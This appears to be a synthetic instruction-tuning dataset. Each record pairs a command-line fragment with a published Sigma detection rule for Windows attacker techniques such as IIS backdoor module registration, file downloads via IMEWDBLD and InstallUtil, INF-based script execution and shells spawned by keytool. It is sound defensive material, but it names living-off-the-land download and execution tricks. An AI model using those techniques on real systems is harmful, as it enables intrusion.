{"instruction": "Write Sigma rule to detect payload:", "input": "\\w3wp appcmd add module system.enterpriseservices.internal.publish \\powershell gacutil /I", "output": "title: Suspicious IIS Module Registration\nid: 043c4b8b-3a54-4780-9682-081cb6b8185c\nstatus: test\ndescription: Detects a suspicious IIS module registration as described in Microsoft threat report on IIS backdoors\nreferences:\n    - https://www.microsoft.com/security/blog/2022/07/26/malicious-iis-extensions-quietly-open-persistent-backdoors-into-servers/\nauthor: Florian Roth (Nextron Systems), Microsoft (idea)\ndate: 2022-08-04\nmodified: 2023-01-23\ntags:\n    - attack.persistence\n    - attack.t1505.004\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_parent:\n        ParentImage|endswith: '\\w3wp.exe'\n    selection_cli_1:\n        CommandLine|contains: 'appcmd.exe add module'\n    selection_cli_2:\n        CommandLine|contains: ' system.enterpriseservices.internal.publish'\n        Image|endswith: '\\powershell.exe'\n    selection_cli_3:\n        CommandLine|contains|all:\n            - 'gacutil'\n            - ' /I'\n    condition: selection_parent and 1 of selection_cli_*\nfalsepositives:\n    - Administrative activity\nlevel: high"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\w3wp.exe appcmd.exe add module system.enterpriseservices.internal.publish \\powershell.exe gacutil /I", "output": "title: Suspicious IIS Module Registration\nid: 043c4b8b-3a54-4780-9682-081cb6b8185c\nstatus: test\ndescription: Detects a suspicious IIS module registration as described in Microsoft threat report on IIS backdoors\nreferences:\n    - https://www.microsoft.com/security/blog/2022/07/26/malicious-iis-extensions-quietly-open-persistent-backdoors-into-servers/\nauthor: Florian Roth (Nextron Systems), Microsoft (idea)\ndate: 2022-08-04\nmodified: 2023-01-23\ntags:\n    - attack.persistence\n    - attack.t1505.004\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_parent:\n        ParentImage|endswith: '\\w3wp.exe'\n    selection_cli_1:\n        CommandLine|contains: 'appcmd.exe add module'\n    selection_cli_2:\n        CommandLine|contains: ' system.enterpriseservices.internal.publish'\n        Image|endswith: '\\powershell.exe'\n    selection_cli_3:\n        CommandLine|contains|all:\n            - 'gacutil'\n            - ' /I'\n    condition: selection_parent and 1 of selection_cli_*\nfalsepositives:\n    - Administrative activity\nlevel: high"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\ilasm.exe ilasm.exe /dll /exe", "output": "title: C# IL Code Compilation Via Ilasm.EXE\nid: 850d55f9-6eeb-4492-ad69-a72338f65ba4\nstatus: test\ndescription: Detects the use of \"Ilasm.EXE\" in order to compile C# intermediate (IL) code to EXE or DLL.\nreferences:\n    - https://lolbas-project.github.io/lolbas/Binaries/Ilasm/\n    - https://www.echotrail.io/insights/search/ilasm.exe\nauthor: frack113, Nasreddine Bencherchali (Nextron Systems)\ndate: 2022-05-07\nmodified: 2022-05-16\ntags:\n    - attack.defense-evasion\n    - attack.t1127\nlogsource:\n    product: windows\n    category: process_creation\ndetection:\n    selection_img:\n        - Image|endswith: '\\ilasm.exe'\n        - OriginalFileName: 'ilasm.exe'\n    selection_cli:\n        CommandLine|contains:\n            - ' /dll'\n            - ' /exe'\n    condition: all of selection_*\nfalsepositives:\n    - Unknown\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\ilasm ilasm /dll /exe", "output": "title: C# IL Code Compilation Via Ilasm.EXE\nid: 850d55f9-6eeb-4492-ad69-a72338f65ba4\nstatus: test\ndescription: Detects the use of \"Ilasm.EXE\" in order to compile C# intermediate (IL) code to EXE or DLL.\nreferences:\n    - https://lolbas-project.github.io/lolbas/Binaries/Ilasm/\n    - https://www.echotrail.io/insights/search/ilasm.exe\nauthor: frack113, Nasreddine Bencherchali (Nextron Systems)\ndate: 2022-05-07\nmodified: 2022-05-16\ntags:\n    - attack.defense-evasion\n    - attack.t1127\nlogsource:\n    product: windows\n    category: process_creation\ndetection:\n    selection_img:\n        - Image|endswith: '\\ilasm.exe'\n        - OriginalFileName: 'ilasm.exe'\n    selection_cli:\n        CommandLine|contains:\n            - ' /dll'\n            - ' /exe'\n    condition: all of selection_*\nfalsepositives:\n    - Unknown\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\ilasm.exe ilasm.exe /dll /exe", "output": "title: C# IL Code Compilation Via Ilasm.EXE\nid: 850d55f9-6eeb-4492-ad69-a72338f65ba4\nstatus: test\ndescription: Detects the use of \"Ilasm.EXE\" in order to compile C# intermediate (IL) code to EXE or DLL.\nreferences:\n    - https://lolbas-project.github.io/lolbas/Binaries/Ilasm/\n    - https://www.echotrail.io/insights/search/ilasm.exe\nauthor: frack113, Nasreddine Bencherchali (Nextron Systems)\ndate: 2022-05-07\nmodified: 2022-05-16\ntags:\n    - attack.defense-evasion\n    - attack.t1127\nlogsource:\n    product: windows\n    category: process_creation\ndetection:\n    selection_img:\n        - Image|endswith: '\\ilasm.exe'\n        - OriginalFileName: 'ilasm.exe'\n    selection_cli:\n        CommandLine|contains:\n            - ' /dll'\n            - ' /exe'\n    condition: all of selection_*\nfalsepositives:\n    - Unknown\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\WmiPrvSE.exe \\svchost.exe \\dllhost.exe \\ImagingDevices.exe \\ImagingDevices.exe", "output": "title: ImagingDevices Unusual Parent/Child Processes\nid: f11f2808-adb4-46c0-802a-8660db50fa99\nstatus: test\ndescription: Detects unusual parent or children of the ImagingDevices.exe (Windows Contacts) process as seen being used with Bumblebee activity\nreferences:\n    - https://thedfirreport.com/2022/09/26/bumblebee-round-two/\nauthor: Nasreddine Bencherchali (Nextron Systems)\ndate: 2022-09-27\nmodified: 2022-12-29\ntags:\n    - attack.defense-evasion\n    - attack.execution\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_parent:\n        ParentImage|endswith:\n            # Add more if known\n            - \\WmiPrvSE.exe\n            - \\svchost.exe\n            - \\dllhost.exe\n        Image|endswith: '\\ImagingDevices.exe'\n    selection_child:\n        # You can add specific suspicious child processes (such as cmd, powershell...) to increase the accuracy\n        ParentImage|endswith: '\\ImagingDevices.exe'\n    condition: 1 of selection_*\nfalsepositives:\n    - Unknown\nlevel: high"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\WmiPrvSE.exe \"\\svcho\"st.exe \\dllhost.exe \\ImagingDevices.exe \\ImagingDevices.exe", "output": "title: ImagingDevices Unusual Parent/Child Processes\nid: f11f2808-adb4-46c0-802a-8660db50fa99\nstatus: test\ndescription: Detects unusual parent or children of the ImagingDevices.exe (Windows Contacts) process as seen being used with Bumblebee activity\nreferences:\n    - https://thedfirreport.com/2022/09/26/bumblebee-round-two/\nauthor: Nasreddine Bencherchali (Nextron Systems)\ndate: 2022-09-27\nmodified: 2022-12-29\ntags:\n    - attack.defense-evasion\n    - attack.execution\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_parent:\n        ParentImage|endswith:\n            # Add more if known\n            - \\WmiPrvSE.exe\n            - \\svchost.exe\n            - \\dllhost.exe\n        Image|endswith: '\\ImagingDevices.exe'\n    selection_child:\n        # You can add specific suspicious child processes (such as cmd, powershell...) to increase the accuracy\n        ParentImage|endswith: '\\ImagingDevices.exe'\n    condition: 1 of selection_*\nfalsepositives:\n    - Unknown\nlevel: high"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\WmiPrvSE \\svchost \\dllhost \\ImagingDevices \\ImagingDevices", "output": "title: ImagingDevices Unusual Parent/Child Processes\nid: f11f2808-adb4-46c0-802a-8660db50fa99\nstatus: test\ndescription: Detects unusual parent or children of the ImagingDevices.exe (Windows Contacts) process as seen being used with Bumblebee activity\nreferences:\n    - https://thedfirreport.com/2022/09/26/bumblebee-round-two/\nauthor: Nasreddine Bencherchali (Nextron Systems)\ndate: 2022-09-27\nmodified: 2022-12-29\ntags:\n    - attack.defense-evasion\n    - attack.execution\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_parent:\n        ParentImage|endswith:\n            # Add more if known\n            - \\WmiPrvSE.exe\n            - \\svchost.exe\n            - \\dllhost.exe\n        Image|endswith: '\\ImagingDevices.exe'\n    selection_child:\n        # You can add specific suspicious child processes (such as cmd, powershell...) to increase the accuracy\n        ParentImage|endswith: '\\ImagingDevices.exe'\n    condition: 1 of selection_*\nfalsepositives:\n    - Unknown\nlevel: high"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\WmiPrvSE.exe \\dllhost.exe \\svchost.exe \\ImagingDevices.exe \\ImagingDevices.exe", "output": "title: ImagingDevices Unusual Parent/Child Processes\nid: f11f2808-adb4-46c0-802a-8660db50fa99\nstatus: test\ndescription: Detects unusual parent or children of the ImagingDevices.exe (Windows Contacts) process as seen being used with Bumblebee activity\nreferences:\n    - https://thedfirreport.com/2022/09/26/bumblebee-round-two/\nauthor: Nasreddine Bencherchali (Nextron Systems)\ndate: 2022-09-27\nmodified: 2022-12-29\ntags:\n    - attack.defense-evasion\n    - attack.execution\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_parent:\n        ParentImage|endswith:\n            # Add more if known\n            - \\WmiPrvSE.exe\n            - \\svchost.exe\n            - \\dllhost.exe\n        Image|endswith: '\\ImagingDevices.exe'\n    selection_child:\n        # You can add specific suspicious child processes (such as cmd, powershell...) to increase the accuracy\n        ParentImage|endswith: '\\ImagingDevices.exe'\n    condition: 1 of selection_*\nfalsepositives:\n    - Unknown\nlevel: high"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\IMEWDBLD.exe imewdbld.exe http:// https://", "output": "title: Arbitrary File Download Via IMEWDBLD.EXE\nid: 863218bd-c7d0-4c52-80cd-0a96c09f54af\nrelated:\n    - id: 8d7e392e-9b28-49e1-831d-5949c6281228\n      type: derived\nstatus: test\ndescription: Detects usage of \"IMEWDBLD.exe\" to download arbitrary files\nreferences:\n    - https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1105/T1105.md#atomic-test-10---windows---powershell-download\n    - https://lolbas-project.github.io/lolbas/Binaries/IMEWDBLD/\nauthor: Swachchhanda Shrawan Poudel\ndate: 2023-11-09\ntags:\n    - attack.defense-evasion\n    - attack.execution\n    - attack.t1218\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image|endswith: '\\IMEWDBLD.exe'\n        - OriginalFileName: 'imewdbld.exe'\n    selection_cli:\n        CommandLine|contains:\n            - 'http://'\n            - 'https://'\n    condition: all of selection_*\nfalsepositives:\n    - Unknown\n# Note: Please reduce this to medium if you find legitimate use case of this utility with a URL\nlevel: high"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\IMEWDBLD.exe imewdbld.exe http:// \"h\"\"t\"\"t\"\"p\"\"s\"\":\"\"/\"\"/\"", "output": "title: Arbitrary File Download Via IMEWDBLD.EXE\nid: 863218bd-c7d0-4c52-80cd-0a96c09f54af\nrelated:\n    - id: 8d7e392e-9b28-49e1-831d-5949c6281228\n      type: derived\nstatus: test\ndescription: Detects usage of \"IMEWDBLD.exe\" to download arbitrary files\nreferences:\n    - https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1105/T1105.md#atomic-test-10---windows---powershell-download\n    - https://lolbas-project.github.io/lolbas/Binaries/IMEWDBLD/\nauthor: Swachchhanda Shrawan Poudel\ndate: 2023-11-09\ntags:\n    - attack.defense-evasion\n    - attack.execution\n    - attack.t1218\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image|endswith: '\\IMEWDBLD.exe'\n        - OriginalFileName: 'imewdbld.exe'\n    selection_cli:\n        CommandLine|contains:\n            - 'http://'\n            - 'https://'\n    condition: all of selection_*\nfalsepositives:\n    - Unknown\n# Note: Please reduce this to medium if you find legitimate use case of this utility with a URL\nlevel: high"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\IMEWDBLD imewdbld http:// https://", "output": "title: Arbitrary File Download Via IMEWDBLD.EXE\nid: 863218bd-c7d0-4c52-80cd-0a96c09f54af\nrelated:\n    - id: 8d7e392e-9b28-49e1-831d-5949c6281228\n      type: derived\nstatus: test\ndescription: Detects usage of \"IMEWDBLD.exe\" to download arbitrary files\nreferences:\n    - https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1105/T1105.md#atomic-test-10---windows---powershell-download\n    - https://lolbas-project.github.io/lolbas/Binaries/IMEWDBLD/\nauthor: Swachchhanda Shrawan Poudel\ndate: 2023-11-09\ntags:\n    - attack.defense-evasion\n    - attack.execution\n    - attack.t1218\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image|endswith: '\\IMEWDBLD.exe'\n        - OriginalFileName: 'imewdbld.exe'\n    selection_cli:\n        CommandLine|contains:\n            - 'http://'\n            - 'https://'\n    condition: all of selection_*\nfalsepositives:\n    - Unknown\n# Note: Please reduce this to medium if you find legitimate use case of this utility with a URL\nlevel: high"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\IMEWDBLD.exe http:// https:// imewdbld.exe", "output": "title: Arbitrary File Download Via IMEWDBLD.EXE\nid: 863218bd-c7d0-4c52-80cd-0a96c09f54af\nrelated:\n    - id: 8d7e392e-9b28-49e1-831d-5949c6281228\n      type: derived\nstatus: test\ndescription: Detects usage of \"IMEWDBLD.exe\" to download arbitrary files\nreferences:\n    - https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1105/T1105.md#atomic-test-10---windows---powershell-download\n    - https://lolbas-project.github.io/lolbas/Binaries/IMEWDBLD/\nauthor: Swachchhanda Shrawan Poudel\ndate: 2023-11-09\ntags:\n    - attack.defense-evasion\n    - attack.execution\n    - attack.t1218\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image|endswith: '\\IMEWDBLD.exe'\n        - OriginalFileName: 'imewdbld.exe'\n    selection_cli:\n        CommandLine|contains:\n            - 'http://'\n            - 'https://'\n    condition: all of selection_*\nfalsepositives:\n    - Unknown\n# Note: Please reduce this to medium if you find legitimate use case of this utility with a URL\nlevel: high"}
{"instruction": "Write Sigma rule to detect payload:", "input": "InfDefaultInstall.exe .inf", "output": "title: InfDefaultInstall.exe .inf Execution\nid: ce7cf472-6fcc-490a-9481-3786840b5d9b\nstatus: test\ndescription: Executes SCT script using scrobj.dll from a command in entered into a specially prepared INF file.\nreferences:\n    - https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1218/T1218.md#atomic-test-4---infdefaultinstallexe-inf-execution\n    - https://lolbas-project.github.io/lolbas/Binaries/Infdefaultinstall/\nauthor: frack113\ndate: 2021-07-13\nmodified: 2022-10-09\ntags:\n    - attack.defense-evasion\n    - attack.t1218\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        CommandLine|contains|all:\n            - 'InfDefaultInstall.exe '\n            - '.inf'\n    condition: selection\nfields:\n    - ComputerName\n    - User\n    - CommandLine\n    - ParentCommandLine\nfalsepositives:\n    - Unknown\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "InfDefaultInstall.exe \\\".inf\\\"", "output": "title: InfDefaultInstall.exe .inf Execution\nid: ce7cf472-6fcc-490a-9481-3786840b5d9b\nstatus: test\ndescription: Executes SCT script using scrobj.dll from a command in entered into a specially prepared INF file.\nreferences:\n    - https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1218/T1218.md#atomic-test-4---infdefaultinstallexe-inf-execution\n    - https://lolbas-project.github.io/lolbas/Binaries/Infdefaultinstall/\nauthor: frack113\ndate: 2021-07-13\nmodified: 2022-10-09\ntags:\n    - attack.defense-evasion\n    - attack.t1218\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        CommandLine|contains|all:\n            - 'InfDefaultInstall.exe '\n            - '.inf'\n    condition: selection\nfields:\n    - ComputerName\n    - User\n    - CommandLine\n    - ParentCommandLine\nfalsepositives:\n    - Unknown\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "InfDefaultInstall .inf", "output": "title: InfDefaultInstall.exe .inf Execution\nid: ce7cf472-6fcc-490a-9481-3786840b5d9b\nstatus: test\ndescription: Executes SCT script using scrobj.dll from a command in entered into a specially prepared INF file.\nreferences:\n    - https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1218/T1218.md#atomic-test-4---infdefaultinstallexe-inf-execution\n    - https://lolbas-project.github.io/lolbas/Binaries/Infdefaultinstall/\nauthor: frack113\ndate: 2021-07-13\nmodified: 2022-10-09\ntags:\n    - attack.defense-evasion\n    - attack.t1218\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        CommandLine|contains|all:\n            - 'InfDefaultInstall.exe '\n            - '.inf'\n    condition: selection\nfields:\n    - ComputerName\n    - User\n    - CommandLine\n    - ParentCommandLine\nfalsepositives:\n    - Unknown\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "InfDefaultInstall.exe .inf", "output": "title: InfDefaultInstall.exe .inf Execution\nid: ce7cf472-6fcc-490a-9481-3786840b5d9b\nstatus: test\ndescription: Executes SCT script using scrobj.dll from a command in entered into a specially prepared INF file.\nreferences:\n    - https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1218/T1218.md#atomic-test-4---infdefaultinstallexe-inf-execution\n    - https://lolbas-project.github.io/lolbas/Binaries/Infdefaultinstall/\nauthor: frack113\ndate: 2021-07-13\nmodified: 2022-10-09\ntags:\n    - attack.defense-evasion\n    - attack.t1218\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        CommandLine|contains|all:\n            - 'InfDefaultInstall.exe '\n            - '.inf'\n    condition: selection\nfields:\n    - ComputerName\n    - User\n    - CommandLine\n    - ParentCommandLine\nfalsepositives:\n    - Unknown\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\InstallUtil.exe InstallUtil.exe ftp:// http:// https://", "output": "title: File Download Via InstallUtil.EXE\nid: 75edd216-1939-4c73-8d61-7f3a0d85b5cc\nstatus: test\ndescription: |\n    Detects use of .NET InstallUtil.exe in order to download arbitrary files. The files will be written to \"%LOCALAPPDATA%\\Microsoft\\Windows\\INetCache\\IE\\\"\nreferences:\n    - https://github.com/LOLBAS-Project/LOLBAS/pull/239\nauthor: Nasreddine Bencherchali (Nextron Systems)\ndate: 2022-08-19\nmodified: 2023-11-09\ntags:\n    - attack.defense-evasion\n    - attack.t1218\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image|endswith: '\\InstallUtil.exe'\n        - OriginalFileName: 'InstallUtil.exe'\n    selection_cli:\n        CommandLine|contains:\n            - 'ftp://'\n            - 'http://'\n            - 'https://'\n    condition: all of selection_*\nfalsepositives:\n    - Unknown\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\InstallUtil.exe \"InstallUtil.exe\" \"ftp://\" http:// https://", "output": "title: File Download Via InstallUtil.EXE\nid: 75edd216-1939-4c73-8d61-7f3a0d85b5cc\nstatus: test\ndescription: |\n    Detects use of .NET InstallUtil.exe in order to download arbitrary files. The files will be written to \"%LOCALAPPDATA%\\Microsoft\\Windows\\INetCache\\IE\\\"\nreferences:\n    - https://github.com/LOLBAS-Project/LOLBAS/pull/239\nauthor: Nasreddine Bencherchali (Nextron Systems)\ndate: 2022-08-19\nmodified: 2023-11-09\ntags:\n    - attack.defense-evasion\n    - attack.t1218\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image|endswith: '\\InstallUtil.exe'\n        - OriginalFileName: 'InstallUtil.exe'\n    selection_cli:\n        CommandLine|contains:\n            - 'ftp://'\n            - 'http://'\n            - 'https://'\n    condition: all of selection_*\nfalsepositives:\n    - Unknown\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\InstallUtil InstallUtil ftp:// http:// https://", "output": "title: File Download Via InstallUtil.EXE\nid: 75edd216-1939-4c73-8d61-7f3a0d85b5cc\nstatus: test\ndescription: |\n    Detects use of .NET InstallUtil.exe in order to download arbitrary files. The files will be written to \"%LOCALAPPDATA%\\Microsoft\\Windows\\INetCache\\IE\\\"\nreferences:\n    - https://github.com/LOLBAS-Project/LOLBAS/pull/239\nauthor: Nasreddine Bencherchali (Nextron Systems)\ndate: 2022-08-19\nmodified: 2023-11-09\ntags:\n    - attack.defense-evasion\n    - attack.t1218\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image|endswith: '\\InstallUtil.exe'\n        - OriginalFileName: 'InstallUtil.exe'\n    selection_cli:\n        CommandLine|contains:\n            - 'ftp://'\n            - 'http://'\n            - 'https://'\n    condition: all of selection_*\nfalsepositives:\n    - Unknown\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\InstallUtil.exe InstallUtil.exe https:// ftp:// http://", "output": "title: File Download Via InstallUtil.EXE\nid: 75edd216-1939-4c73-8d61-7f3a0d85b5cc\nstatus: test\ndescription: |\n    Detects use of .NET InstallUtil.exe in order to download arbitrary files. The files will be written to \"%LOCALAPPDATA%\\Microsoft\\Windows\\INetCache\\IE\\\"\nreferences:\n    - https://github.com/LOLBAS-Project/LOLBAS/pull/239\nauthor: Nasreddine Bencherchali (Nextron Systems)\ndate: 2022-08-19\nmodified: 2023-11-09\ntags:\n    - attack.defense-evasion\n    - attack.t1218\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image|endswith: '\\InstallUtil.exe'\n        - OriginalFileName: 'InstallUtil.exe'\n    selection_cli:\n        CommandLine|contains:\n            - 'ftp://'\n            - 'http://'\n            - 'https://'\n    condition: all of selection_*\nfalsepositives:\n    - Unknown\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\keytool.exe \\cmd.exe \\sh.exe \\bash.exe \\powershell.exe \\pwsh.exe \\schtasks.exe \\certutil.exe \\whoami.exe \\bitsadmin.exe \\wscript.exe \\cscript.exe \\scrcons.exe \\regsvr32.exe \\hh.exe \\wmic.exe \\mshta.exe \\rundll32.exe \\forfiles.exe \\scriptrunner.exe \\mftrace.exe \\AppVLP.exe \\systeminfo.exe \\reg.exe \\query.exe", "output": "title: Suspicious Shells Spawn by Java Utility Keytool\nid: 90fb5e62-ca1f-4e22-b42e-cc521874c938\nstatus: test\ndescription: Detects suspicious shell spawn from Java utility keytool process (e.g. adselfservice plus exploitation)\nreferences:\n    - https://redcanary.com/blog/intelligence-insights-december-2021\n    - https://www.synacktiv.com/en/publications/how-to-exploit-cve-2021-40539-on-manageengine-adselfservice-plus.html\nauthor: Andreas Hunkeler (@Karneades)\ndate: 2021-12-22\nmodified: 2023-01-21\ntags:\n    - attack.initial-access\n    - attack.persistence\n    - attack.privilege-escalation\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        ParentImage|endswith: '\\keytool.exe'\n        Image|endswith:\n            - '\\cmd.exe'\n            - '\\sh.exe'\n            - '\\bash.exe'\n            - '\\powershell.exe'\n            - '\\pwsh.exe'\n            - '\\schtasks.exe'\n            - '\\certutil.exe'\n            - '\\whoami.exe'\n            - '\\bitsadmin.exe'\n            - '\\wscript.exe'\n            - '\\cscript.exe'\n            - '\\scrcons.exe'\n            - '\\regsvr32.exe'\n            - '\\hh.exe'\n            - '\\wmic.exe'\n            - '\\mshta.exe'\n            - '\\rundll32.exe'\n            - '\\forfiles.exe'\n            - '\\scriptrunner.exe'\n            - '\\mftrace.exe'\n            - '\\AppVLP.exe'\n            - '\\systeminfo.exe'\n            - '\\reg.exe'\n            - '\\query.exe'\n    condition: selection\nfalsepositives:\n    - Unknown\nlevel: high"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\keytool.exe \\cmd.exe \\sh.exe \\bash.exe \\powershell.exe \\pwsh.exe \\schtasks.exe \\certutil.exe \\whoami.exe \\bitsadmin.exe \\wscript.exe \\cscript.exe \\scrcons.exe \\regsvr32.exe \\hh.exe \\wmic.exe \\mshta.exe \\rundll32.exe \\forfiles.exe \\scriptrunner.exe \\mftrace.exe \\AppVLP.exe \\systeminfo.exe \\reg.exe \\\"\\query.exe\\\"", "output": "title: Suspicious Shells Spawn by Java Utility Keytool\nid: 90fb5e62-ca1f-4e22-b42e-cc521874c938\nstatus: test\ndescription: Detects suspicious shell spawn from Java utility keytool process (e.g. adselfservice plus exploitation)\nreferences:\n    - https://redcanary.com/blog/intelligence-insights-december-2021\n    - https://www.synacktiv.com/en/publications/how-to-exploit-cve-2021-40539-on-manageengine-adselfservice-plus.html\nauthor: Andreas Hunkeler (@Karneades)\ndate: 2021-12-22\nmodified: 2023-01-21\ntags:\n    - attack.initial-access\n    - attack.persistence\n    - attack.privilege-escalation\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        ParentImage|endswith: '\\keytool.exe'\n        Image|endswith:\n            - '\\cmd.exe'\n            - '\\sh.exe'\n            - '\\bash.exe'\n            - '\\powershell.exe'\n            - '\\pwsh.exe'\n            - '\\schtasks.exe'\n            - '\\certutil.exe'\n            - '\\whoami.exe'\n            - '\\bitsadmin.exe'\n            - '\\wscript.exe'\n            - '\\cscript.exe'\n            - '\\scrcons.exe'\n            - '\\regsvr32.exe'\n            - '\\hh.exe'\n            - '\\wmic.exe'\n            - '\\mshta.exe'\n            - '\\rundll32.exe'\n            - '\\forfiles.exe'\n            - '\\scriptrunner.exe'\n            - '\\mftrace.exe'\n            - '\\AppVLP.exe'\n            - '\\systeminfo.exe'\n            - '\\reg.exe'\n            - '\\query.exe'\n    condition: selection\nfalsepositives:\n    - Unknown\nlevel: high"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\keytool.exe \\cmd.exe \\sh.exe \\bash.exe \\powershell.exe \\pwsh.exe \\schtasks.exe \\certutil.exe \\whoami.exe \\bitsadmin.exe \\wscript.exe \\cscript.exe \\scrcons.exe \\regsvr32.exe \\hh.exe \\wmic.exe \\mshta.exe \\rundll32.exe \\forfiles.exe \\scriptrunner.exe \\mftrace.exe \\AppVLP.exe \\systeminfo.exe \\reg.exe \\query.exe", "output": "title: Suspicious Shells Spawn by Java Utility Keytool\nid: 90fb5e62-ca1f-4e22-b42e-cc521874c938\nstatus: test\ndescription: Detects suspicious shell spawn from Java utility keytool process (e.g. adselfservice plus exploitation)\nreferences:\n    - https://redcanary.com/blog/intelligence-insights-december-2021\n    - https://www.synacktiv.com/en/publications/how-to-exploit-cve-2021-40539-on-manageengine-adselfservice-plus.html\nauthor: Andreas Hunkeler (@Karneades)\ndate: 2021-12-22\nmodified: 2023-01-21\ntags:\n    - attack.initial-access\n    - attack.persistence\n    - attack.privilege-escalation\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        ParentImage|endswith: '\\keytool.exe'\n        Image|endswith:\n            - '\\cmd.exe'\n            - '\\sh.exe'\n            - '\\bash.exe'\n            - '\\powershell.exe'\n            - '\\pwsh.exe'\n            - '\\schtasks.exe'\n            - '\\certutil.exe'\n            - '\\whoami.exe'\n            - '\\bitsadmin.exe'\n            - '\\wscript.exe'\n            - '\\cscript.exe'\n            - '\\scrcons.exe'\n            - '\\regsvr32.exe'\n            - '\\hh.exe'\n            - '\\wmic.exe'\n            - '\\mshta.exe'\n            - '\\rundll32.exe'\n            - '\\forfiles.exe'\n            - '\\scriptrunner.exe'\n            - '\\mftrace.exe'\n            - '\\AppVLP.exe'\n            - '\\systeminfo.exe'\n            - '\\reg.exe'\n            - '\\query.exe'\n    condition: selection\nfalsepositives:\n    - Unknown\nlevel: high"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\keytool \\cmd \\sh \\bash \\powershell \\pwsh \\schtasks \\certutil \\whoami \\bitsadmin \\wscript \\cscript \\scrcons \\regsvr32 \\hh \\wmic \\mshta \\rundll32 \\forfiles \\scriptrunner \\mftrace \\AppVLP \\systeminfo \\reg \\query", "output": "title: Suspicious Shells Spawn by Java Utility Keytool\nid: 90fb5e62-ca1f-4e22-b42e-cc521874c938\nstatus: test\ndescription: Detects suspicious shell spawn from Java utility keytool process (e.g. adselfservice plus exploitation)\nreferences:\n    - https://redcanary.com/blog/intelligence-insights-december-2021\n    - https://www.synacktiv.com/en/publications/how-to-exploit-cve-2021-40539-on-manageengine-adselfservice-plus.html\nauthor: Andreas Hunkeler (@Karneades)\ndate: 2021-12-22\nmodified: 2023-01-21\ntags:\n    - attack.initial-access\n    - attack.persistence\n    - attack.privilege-escalation\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        ParentImage|endswith: '\\keytool.exe'\n        Image|endswith:\n            - '\\cmd.exe'\n            - '\\sh.exe'\n            - '\\bash.exe'\n            - '\\powershell.exe'\n            - '\\pwsh.exe'\n            - '\\schtasks.exe'\n            - '\\certutil.exe'\n            - '\\whoami.exe'\n            - '\\bitsadmin.exe'\n            - '\\wscript.exe'\n            - '\\cscript.exe'\n            - '\\scrcons.exe'\n            - '\\regsvr32.exe'\n            - '\\hh.exe'\n            - '\\wmic.exe'\n            - '\\mshta.exe'\n            - '\\rundll32.exe'\n            - '\\forfiles.exe'\n            - '\\scriptrunner.exe'\n            - '\\mftrace.exe'\n            - '\\AppVLP.exe'\n            - '\\systeminfo.exe'\n            - '\\reg.exe'\n            - '\\query.exe'\n    condition: selection\nfalsepositives:\n    - Unknown\nlevel: high"}
